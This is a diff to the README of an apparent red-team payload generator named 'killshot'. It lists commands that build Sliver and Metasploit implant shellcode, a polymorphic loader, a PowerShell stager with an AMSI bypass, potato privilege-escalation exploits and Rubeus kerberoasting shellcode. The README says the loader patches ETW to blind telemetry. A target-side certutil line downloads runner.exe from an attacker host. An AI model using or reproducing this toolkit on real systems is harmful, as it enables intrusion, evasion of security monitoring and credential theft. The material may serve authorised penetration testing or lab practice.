@@ -24,11 +24,11 @@ callback, CreateFiber). Runner.exe patches ETW before execution to blind telemet
 # 1. Install (downloads tools + sets up compilers)
 ./install.sh
 
-# 2. Generate all payloads
-./killshot.sh -l 10.10.14.5
+# 2. Generate everything
+killshot generate --all -l 10.10.14.5
 
 # 3. Serve files
-cd /workspace && python3 -m http.server 8000
+killshot serve
 
 # 4. On target
 certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
@@ -40,7 +40,7 @@ certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
 | Script | Purpose |
 |---|---|
 | `install.sh` | Downloads tools, installs Go/Donut/garble, verifies everything |
-| `killshot.sh` | Main generator — runs full pipeline (C2 + runner + tools) |
+| `killshot.sh` | Main generator — component-based payload generation |
 | `killshot.py` | Converts individual tools to Donut shellcode |
 | `gen_runner.py` | Generates polymorphic Go shellcode loader |
 | `gen_stager.py` | Generates PowerShell stager with AMSI bypass |
@@ -91,16 +91,26 @@ certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
 All operations go through a single `killshot` command:
 
 ```bash
-killshot help                                  # Show help
-killshot list                                  # List available tools
-killshot check                                 # Verify installation
-killshot generate -l 10.10.14.5                # Full pipeline (Sliver)
-killshot generate -l 10.10.14.5 -f msf         # Full pipeline (Metasploit)
-killshot generate -l 10.10.14.5 -t session     # Sliver session mode
-killshot tool Certify -p 'find /vulnerable'    # Single tool to shellcode
-killshot tool Rubeus -p 'kerberoast'           # Rubeus to shellcode
-killshot all -l 10.10.14.5                     # All tools to shellcode
-killshot serve                                 # HTTP server for workspace
+# Info & verification
+killshot help                                           # Show help
+killshot list                                           # List available tools
+killshot check                                          # Verify installation
+killshot serve                                          # HTTP server for workspace
+
+# Generate specific components (mix and match)
+killshot generate --runner                              # Polymorphic runner.exe only
+killshot generate --implant -l 10.10.14.5               # C2 implant shellcode (Sliver)
+killshot generate --implant -l 10.10.14.5 -f msf        # C2 implant shellcode (MSF)
+killshot generate --stager                              # PowerShell stager with AMSI bypass
+killshot generate --tool Rubeus --params 'kerberoast'   # Single tool to shellcode
+killshot generate --tool Certify                        # Single tool (default params)
+killshot generate --tools                               # All tools to shellcode
+killshot generate --potato GodPotato -c 'cmd /c whoami' # Single potato exploit
+killshot generate --potatoes -c 'cmd /c whoami'         # All potato exploits
+killshot generate --loaders                             # PowerShell tool loaders
+
+# Generate everything at once
+killshot generate --all -l 10.10.14.5
 ```
 
 ### install.sh — Setup & Maintenance
